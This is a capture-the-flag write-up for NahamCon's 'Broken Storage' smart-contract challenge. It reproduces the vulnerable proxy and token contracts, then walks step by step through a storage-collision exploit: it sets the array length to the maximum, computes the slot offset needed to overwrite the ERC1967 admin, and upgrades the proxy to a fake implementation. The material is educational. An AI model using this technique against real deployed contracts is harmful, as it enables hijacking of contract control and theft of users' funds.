# Broken Storage [0 solve] [500 points]

![](https://i.imgur.com/kdn319a.png)

I discovered this CTF event on the last hour, and I solved this challenge 4 min after the CTF end 🥲

### Description
```
Storage is almost infinite, isn't it?

Deploy Details:
{
  "Buckets": [
    "0x95bD8D42f30351685e96C62EDdc0d0613bf9a87A"
  ],
  "BucketsProxy": [
    "0x98eDDadCfde04dC22a0e62119617e74a6Bc77313"
  ],
  "OpenZeppelin/openzeppelin-contracts@4.5.0/Address": [],
  "OpenZeppelin/openzeppelin-contracts@4.5.0/ERC1967Proxy": [],
  "OpenZeppelin/openzeppelin-contracts@4.5.0/ERC20": [],
  "OpenZeppelin/openzeppelin-contracts@4.5.0/StorageSlot": []
}
Private RPC URL:
https://ctf.nahamcon.com/challenge/38/0a2f6c1c-3f11-419a-90e0-9fb978d93a6c
Mnemonic:
test test test test test test test test test test test junk
```

The objective of this challenge is to change the admin of the proxy and make the balance of admin become 0x1337

### challenge.py : 
```python
from brownie import *


def restricted_accounts():
    return [accounts[8]]

def deploy():
    ADMIN = accounts[8]
    buckets = Buckets.deploy({'from': ADMIN})
    bucketsProxy = BucketsProxy.deploy(buckets, 5, {'from': ADMIN})
    
def solved():    
    ADMIN = accounts[8]
    proxy_buckets = Contract.from_abi("Buckets", BucketsProxy[-1], Buckets.abi)

    if BucketsProxy[-1].getAdmin() != ADMIN and proxy_buckets.balanceOf(ADMIN) == 0x1337:
        return True, "Solved!"
    else:
        return False, "Not solved."

CONFIG = {
    # "RPC": '',
    # "BLOCK_NUMBER": '',
    # 'FLAGS': '',
    'MNEMONIC': 'test test test test test test test test test test test junk',
    # 'RUNNABLES': [],
    # 'ALLOWED_RPC_METHODS': []
}
```

### Buckets.sol : 
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

abstract contract BucketsBase {
    uint256[] public buckets;
}

contract Buckets is BucketsBase, Initializable, ERC20 {
    uint256 private constant MAX_BUCKETS = 10;

    constructor() ERC20("Buckets", "Bucket") {}

    function initialize(uint256 premint) external initializer {
        buckets = new uint256[](MAX_BUCKETS);

        buckets[0] = premint;
        _mint(msg.sender, premint);
    }

    // put some ether in a bucket and mint bucket tokens
    function deposit(uint256 bucketNumber, uint256 value) external payable {
        buckets[bucketNumber] += value;
        _mint(msg.sender, value);
    }

    // withdraw some ether from a bucket and burn bucket tokens
    function withdraw(uint256 bucketNumber, uint256 amount) external {
        buckets[bucketNumber] -= amount;
        _burn(msg.sender, amount);
    }
}
```

### BucketsProxy.sol : 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "./Buckets.sol";

contract BucketsProxy is ERC1967Proxy {
    // a secret to change the proxy admin in case of an emergency
    // e. g. if the original admin dies
    uint256 public salt;

    constructor(address logic, uint256 premint) ERC1967Proxy(logic, abi.encodeWithSelector(Buckets.initialize.selector, premint)) {
        _changeAdmin(msg.sender);
    }

    // a failsafe admin has a secret address derived from the 256bit secret
    // we allow the method to be called by anyone to not to reveal secret failsafe addresses
    function setFailsafeAdmin(uint256 salt_) external {
        require(salt_ != 0, "SALT_CANNOT_BE_ZERO");
        salt = salt_;
    }

    // only the address that matches the secret should be able to run this method
    // this method should be called in emergency cases when the original administrator has disappeared
    function changeAdmin() external {
        require(keccak256(abi.encode(salt, msg.sender)) == keccak256(abi.encode(_getAdmin())));
        _changeAdmin(msg.sender);
    }

    // upgrade the Buckets implementation
    function upgradeTo(address newImplementation) external {
        require(_getAdmin() == msg.sender, "ADMIN_ONLY");
        _upgradeTo(newImplementation);
    }

    function getAdmin() external view returns(address){
        return _getAdmin();
    }
    
}
```

BucketsProxy.sol will be the proxy and Buckets.sol will be the implementation

There is a storage collision on slot 0, the proxy is using it for the uint256 `salt`, and it can be changed to any uint256 value except 0 by anyone using `setFailsafeAdmin()`, and the implementation is using it for the uint256 array `buckets`

```solidity
    function setFailsafeAdmin(uint256 salt_) external {
        require(salt_ != 0, "SALT_CANNOT_BE_ZERO");
        salt = salt_;
    }
```

As `buckets` is an dynamic array, the length of it is stored on slot 0, and we can change the length of `buckets` to any value using `setFailsafeAdmin()` due to the storage collision


Then just call `setFailsafeAdmin(115792089237316195423570985008687907853269984665640564039457584007913129639935)` to the proxy contract, which will change the length of `buckets` to the maximum value so the `deposit()` and `withdraw()` function on the implementation can alter storage slot that it shouldn't be able to

```soldiity
    function deposit(uint256 bucketNumber, uint256 value) external payable {
        buckets[bucketNumber] += value;
        _mint(msg.sender, value);
    }

    // withdraw some ether from a bucket and burn bucket tokens
    function withdraw(uint256 bucketNumber, uint256 amount) external {
        buckets[bucketNumber] -= amount;
        _burn(msg.sender, amount);
    }
```

The proxy is using ERC1967Proxy : 
https://eips.ethereum.org/EIPS/eip-1967#admin-address

The admin address is stored on slot `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`

```python
>>> web3.eth.get_storage_at('0x98eDDadCfde04dC22a0e62119617e74a6Bc77313', 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103)
HexBytes('0x00000000000000000000000023618e81e3f5cdf7f54c3d65f7fbc0abf5b21e8f')
```

We want to change it to our address `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, by adding a number to it using `deposit()` to the specific `bucketNumber`

First, find out the amount need to be added
```python
>>> 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 - 0x00000000000000000000000023618e81e3f5cdf7f54c3d65f7fbc0abf5b21e8f
1188859032378941226414648521226496738097503863767
```

Then we have to find out the element of the array which will be stored on the same storage slot for admin

As `buckets` is a dynamic array and in slot 0, the first element will be at the keccak256 hash of 0

```python
>>> web3.keccak(int(0).to_bytes(32, 'big')).hex()
'0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563'

>>> web3.eth.get_storage_at('0x98eDDadCfde04dC22a0e62119617e74a6Bc77313', 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563)
HexBytes('0x0000000000000000000000000000000000000000000000000000000000000005')
```

2nd element will be at the keccak256 hash of 0 plus 1, 3rd element will be plus 2, and so on

The admin address is stored at `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`, so just find out which element will be on the same slot

```python
>>> 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103 - 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
63386042604410164362045476879090279004621706715927965350536461637453372554144
```

Then just call `deposit(63386042604410164362045476879090279004621706715927965350536461637453372554144, 1188859032378941226414648521226496738097503863767)`, which will change the admin slot to our address, this will work because we have already changed the length of `buckets` to the maximum

```python
>>> web3.eth.get_storage_at('0x98eDDadCfde04dC22a0e62119617e74a6Bc77313', 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103)
HexBytes('0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266')
```

After we become the admin of the proxy, we can just deploy another contract as implementation, which will return the balance of admin as `0x1337`, and change it to the implementation of the proxy with `upgradeTo()`

```solidity
pragma solidity ^0.8.0;

contract fake {
    function balanceOf(address) public view returns(uint256) {
        return 0x1337;
    }
}
```

Then the challenge is solved